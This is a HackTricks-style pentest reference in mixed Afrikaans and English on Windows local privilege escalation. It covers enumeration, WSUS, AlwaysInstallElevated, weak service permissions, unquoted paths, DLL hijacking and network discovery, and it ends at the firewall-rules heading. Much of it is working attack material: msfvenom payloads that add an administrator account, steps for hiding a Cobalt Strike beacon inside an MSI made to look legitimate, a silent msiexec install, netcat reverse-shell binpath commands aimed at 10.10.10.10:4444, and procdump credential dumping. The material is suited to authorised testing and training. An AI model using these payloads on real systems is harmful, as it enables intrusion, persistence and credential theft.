# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste hulpmiddel om na Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Daar is verskillende dinge in Windows wat jou kan **voorkom om die stelsel te e­nume­reer**, uitvoerbare lêers te laat loop of selfs jou aktiwiteite te **ontdek**. Jy moet die volgende **bladsy** **lees** en al hierdie **verdedigings** **meganismes** **opnoem** voordat jy met die privilege escalation enumeration begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

Kontroleer of die Windows-weergawe enige bekende kwetsbaarheid het (kontroleer ook watter patches toegepas is).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe-eksploite

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft sekuriteitskwesbaarhede te vind. Hierdie databasis bevat meer as 4 700 sekuriteitskwesbaarhede, wat die **massiewe aanval-oppervlak** toon wat 'n Windows-omgewing bied.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_

**Lokaal met stelsel-inligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-repo's van eksploite:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Enige credential/Juicy info gestoor in die env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript lêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word aangeteken, insluitend uitgevoerde opdragte, opdragoproepe en dele van skripte. Volledige uitvoeringsbesonderhede en uitsetresultate mag egter nie vasgelê word nie.

Om dit te aktiveer, volg die instruksies in die "Transcript files" afdeling van die dokumentasie, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeurtenisse uit die PowersShell logs te sien, kan jy die volgende uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

'n Volledige rekord van aktiwiteit en die volle inhoud van die script se uitvoering word vasgelê, wat verseker dat elke block of code gedokumenteer word terwyl dit uitgevoer word. Hierdie proses bewaar 'n omvattende ouditspoor van elke aktiwiteit, waardevol vir forensiese ontleding en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit op die tyd van uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Loggebeurtenisse vir die Script Block kan gevind word in die Windows Event Viewer by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeure te sien, kan jy gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Skywe
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die opdaterings nie via http**S** aangevra word nie, maar via http.

Jy begin deur te kyk of die netwerk 'n nie-SSL WSUS-opdatering gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy 'n antwoord ontvang soos een van hierdie:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registers **geaktiveer** is (waarde is **0x1**), dan kan gebruikers met enige voorregte **installeer** (uitvoer) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer met die module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI` kommando van power-up om binne die huidige gids 'n Windows MSI binary te skep om voorregte te eskaleer. Hierdie skrip skryf 'n vooraf-gekompileerde MSI-installer uit wat vra om 'n gebruiker/groep by te voeg (dus sal jy GIU access nodig hê):
```
Write-UserAddMSI
```
Voer net die geskepte binary uit om privileges te eskaleer.

### MSI Wrapper

Lees hierdie handleiding om te leer hoe om 'n MSI wrapper te skep met hierdie gereedskap. Neem kennis dat jy 'n "**.bat**" lêer kan inpak as jy **slegs** kommando-lyne wil **uitvoer**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Skep MSI met WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Skep MSI met Visual Studio

- **Genereer** met Cobalt Strike of Metasploit 'n **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekveld. Kies die **Setup Wizard** projek en klik **Next**.
- Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Klik herhaaldelik **Next** tot jy by stap 3 van 4 (kies lêers om in te sluit) kom. Klik **Add** en kies die Beacon payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc** projek in die **Solution Explorer** en verander in die **Properties** die **TargetPlatform** van **x86** na **x64**.
- Daar is ander properties wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde app meer legitiem kan laat voorkom.
- Regsklik die projek en kies **View > Custom Actions**.
- Regsklik **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe** lêer en klik **OK**. Dit verseker dat die beacon payload uitgevoer word sodra die installer uitgevoer word.
- Onder die **Custom Action Properties**, verander **Run64Bit** na **True**.
- Laastens, **build** dit.
- As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` verskyn, maak seker jy stel die platform op x64.

### MSI Installasie

Om die **installasie** van die kwaadwillige `.msi` lêer in die **agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid te misbruik kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en detektore

### Ouditinstellings

Hierdie instellings bepaal wat **aangeteken** word, dus moet jy daar aandag aan skenk.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding is interessant om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van local Administrator passwords**, wat verseker dat elke wagwoord **unik, willekeurig en gereeld bygewerk** word op rekenaars wat by 'n domein aangesluit is. Hierdie wagwoorde word veilig binne Active Directory gestoor en kan slegs deur gebruikers benader word wat voldoende toestemmings via ACLs ontvang het, wat hulle toelaat om local admin passwords te besigtig indien gemagtig.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

As dit aktief is, **word plain-text passwords in LSASS gestoor** (Local Security Authority Subsystem Service).\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingestel om pogings deur onbetroubare prosesse om **sy geheue te lees** of kode in te spuit te **blokkeer**, en sodoende die stelsel verder te beveilig.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is bekendgestel in **Windows 10**. Daarmee beoog dit om die credentials wat op 'n toestel gestoor is, te beskerm teen bedreigings soos pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gekasheerde Kredensiale

**Domein-kredensiale** word geverifieer deur die **Local Security Authority** (LSA) en deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmelddata deur 'n geregistreerde security package geverifieer word, word domein-kredensiale vir die gebruiker tipies vasgestel.\
[**Meer inligting oor Gekasheerde Kredensiale hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Enumereer Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waartoe jy behoort interessante toestemmings het
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

As jy **tot 'n bevoorregte groep behoort kan jy moontlik jou bevoegdhede eskaleer**. Leer oor bevoorregte groepe en hoe om hulle te misbruik om bevoegdhede te eskaleer hier:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Lees meer** oor wat 'n **token** is op hierdie blad: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Kyk na die volgende blad om **meer te leer oor interessante tokens** en hoe om hulle te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuismappe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Lopende Prosesse

### Lêer- en gidspermissies

Eerstens, wanneer jy die prosesse lys, **kyk vir passwords binne die command line van die proses**.\
Kyk of jy **oorskryf enige lopende binary** of jy skryfpermissies op die binary-gids het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) uit te buit:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kontroleer die toestemmings van die proses-binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer permissies van die vouers van die prosesse se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Geheue Password mining

Jy kan 'n geheue dump van 'n lopende proses skep met **procdump** van sysinternals. Dienste soos FTP hou die **credentials in clear text in memory**; probeer om die geheue te dump en die credentials te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-apps

**Toepassings wat as SYSTEM loop kan 'n gebruiker toelaat om 'n CMD te open, of gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek na "command prompt", klik op "Click to open Command Prompt"

## Dienste

Kry 'n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissies

Jy kan **sc** gebruik om inligting oor 'n diens te kry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binary **accesschk** van _Sysinternals_ te hê om die vereiste voorregvlak vir elke diens te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_Sisteemfout 1058 het voorgekom._\
_Die diens kan nie gestart word nie, hetsy omdat dit gedeaktiveer is of omdat daar geen geaktiveerde toestelle daarmee geassosieer is nie._

Jy kan dit aktiveer deur
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost van SSDPSRV afhanklik is om te werk (vir XP SP1)**

**Nog 'n ompad vir hierdie probleem is om die volgende te laat loop:**
```
sc.exe config usosvc start= auto
```
### **Wysig diens se binêre pad**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op 'n diens het, is dit moontlik om die diens se uitvoerbare binêre te wysig. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegieë kan verhoog word deur verskeie permissies:

- **SERVICE_CHANGE_CONFIG**: Laat toe om die service-binary te herkonfigureer.
- **WRITE_DAC**: Maak dit moontlik om permissies te herkonfigureer, wat daartoe lei dat dienskonfigurasies verander kan word.
- **WRITE_OWNER**: Laat toe om eienaarskap te verkry en permissies te herkonfigureer.
- **GENERIC_WRITE**: Erf die vermoë om dienskonfigurasies te verander.
- **GENERIC_ALL**: Erf ook die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan die _exploit/windows/local/service_permissions_ gebruik word.

### Swak permissies op service-binaries

**Kontroleer of jy die binary wat deur 'n service uitgevoer word, kan wysig** of of jy **skryfpermissies op die gids** het waar die binary geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binary wat deur 'n service uitgevoer word kry deur **wmic** te gebruik (nie in system32 nie) en jou permissies nagaan met **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Wysig toestemmings van die diensregister

Jy moet nagaan of jy enige diensregister kan wysig.\
Jy kan jou **toestemmings** oor 'n **diensregister** **nagaan** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Daar moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings besit. Indien wel, kan die binary wat deur die service uitgevoer word, verander word.

Om die Path van die uitgevoerde binary te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dienste-register AppendData/AddSubdirectory toestemmings

As jy hierdie toestemming oor 'n register het, beteken dit dat **jy sub-registers van hierdie een kan skep**. In die geval van Windows services is dit **genoeg om ewekansige kode uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

As die pad na 'n uitvoerbare lêer nie binne aanhalingstekens is nie, sal Windows probeer om elke eindstuk voor 'n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle dienspaaie sonder aanhalingstekens, uitgesonderd dié wat behoort aan ingeboude Windows-dienste:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid met metasploit opspoor en uitbuit:** `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n diens-binêr met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat geneem moet word as 'n diens faal. Hierdie funksie kan gekonfigureer word om na 'n binary te wys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede is beskikbaar in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Toepassings

### Geïnstalleerde Toepassings

Kontroleer die **permissions of the binaries** (dalk kan jy een oor-skryf en privilege escalation moontlik maak) en van die **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryfregte

Kyk of jy 'n konfigurasielêer kan wysig om 'n spesiale lêer te lees, of of jy 'n binêre kan wysig wat deur 'n Administrator account (schedtasks) uitgevoer gaan word.

Een manier om swak gids-/lêertoestemmings in die stelsel te vind, is om die volgende uit te voer:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Voer by opstart uit

**Kyk of jy 'n registry of binary kan oorskryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Soek moontlike **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As 'n driver 'n willekeurige kernel lees-/skryf-primitief blootstel (algemeen in swak ontwerpte IOCTL-handlers), kan jy eskaleer deur 'n SYSTEM token direk uit kernelgeheue te steel. Sien die stap‑vir‑stap tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Kontroleer die toestemmings van alle vouers binne PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Netwerk

### Gedeelde gidse
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kontroleer vir ander bekende rekenaars wat hardcoded in die hosts file is
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerkinterfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kontroleer vir **beperkte dienste** van buite
```bash
netstat -ano #Opened ports?
```
### Roeteringstabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-reëls

